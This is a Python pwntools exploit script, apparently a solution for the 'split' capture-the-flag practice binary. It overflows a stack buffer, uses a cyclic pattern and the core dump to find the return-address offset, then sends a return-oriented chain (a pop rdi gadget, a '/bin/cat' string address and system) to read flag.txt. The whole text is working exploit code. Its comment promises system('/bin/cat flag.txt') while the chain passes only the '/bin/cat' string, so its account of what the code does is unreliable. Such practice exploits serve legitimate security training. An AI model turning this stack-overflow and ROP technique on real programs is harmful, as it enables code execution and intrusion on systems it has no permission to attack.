from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-peda
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './split'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Locate the functions/strings we need
pop_rdi_gadget = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
# ropper -f split --search "pop rdi; ret;"
# pop_rdi_gadget = 0x4007c3
bincat_addr = next(elf.search(b'/bin/cat'))
system_addr = elf.symbols['system']

# Print out the target address
info("%#x pop rdi; ret;", pop_rdi_gadget)
info("%#x /bin/cat", bincat_addr)
info("%#x system", system_addr)

# We will send a 'cyclic' pattern which overwrites the return address on the stack
payload = cyclic(100)

# PWN
io.sendlineafter('>', payload)

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing (SP for ARM)
stack = core.rsp
info("%#x stack", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
offset = cyclic_find(pattern)
info("%r pattern (offset: %r)", pattern, offset)

# Craft a new payload which puts system('/bin/cat flag.txt') at correct offset
# Note that we have to call pop_rdi gadget here
payload = flat(
    asm('nop') * offset,
    pop_rdi_gadget,
    bincat_addr,
    system_addr
)

# Send the payload to a new copy of the process
io = start()
io.sendline(payload)
io.recv()

# Get our flag!
flag = io.recvline()
success(flag)
